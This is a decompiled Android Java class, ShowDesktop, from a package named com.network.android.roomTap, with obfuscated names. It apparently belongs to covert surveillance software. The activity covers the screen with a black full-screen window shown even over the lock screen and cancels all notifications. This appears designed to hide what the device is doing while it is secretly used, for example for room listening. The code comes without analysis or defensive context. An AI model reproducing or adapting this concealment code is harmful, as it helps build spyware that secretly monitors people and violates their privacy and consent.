package com.network.android.roomTap;

import android.app.Activity;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.ImageView;
import android.widget.LinearLayout;
import com.network.android.C0000R;
import com.network.android.agent.NetworkApp;
import com.network.android.c.a.a;

public class ShowDesktop extends Activity {
    public static long c = 0;
    public static boolean d = false;
    public static String e = null;

    /* renamed from: a  reason: collision with root package name */
    LinearLayout f113a;
    ImageView b;
    private View f;
    private Handler g = new Handler();
    private BroadcastReceiver h = new q(this);
    private Runnable i = new r(this);

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        if (!k.f122a) {
            super.onCreate(bundle);
            a.a("ShowDesktop onCreate. isCreatingFiltersAllowed = false. returning ");
            NetworkApp.a().sendBroadcast(new Intent("com.network.showdesktop"));
            finish();
            return;
        }
        super.onCreate(bundle);
        a.a("ShowDesktop onCreate");
        try {
            registerReceiver(this.h, new IntentFilter("com.network.showdesktop"));
            requestWindowFeature(1);
            getWindow().setFlags(1024, 1024);
            getWindow().setFlags(524288, 524288);
            getWindow().setFlags(1048576, 1048576);
            setContentView(C0000R.layout.main);
            this.f113a = (LinearLayout) findViewById(C0000R.id.mainLayout);
            this.f = this.f113a.getRootView();
            this.f.setDrawingCacheEnabled(true);
            this.b = (ImageView) findViewById(C0000R.id.ImageView01);
            getWindow().setType(2004);
            ((NotificationManager) getSystemService("notification")).cancelAll();
            d = true;
            a.a("Show Black Desktop");
        } catch (Exception e2) {
            a.a("ShowDesktop onCreate Exception- " + e2.getMessage(), e2);
        }
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
        a.a("Show onDestroy");
        try {
            unregisterReceiver(this.h);
            c = 0;
            d = false;
        } catch (Throwable th) {
        }
    }

    public void onResume() {
        super.onResume();
        c = System.currentTimeMillis() / 1000;
        a.a("ShowDesktop: onResume: ");
    }
}
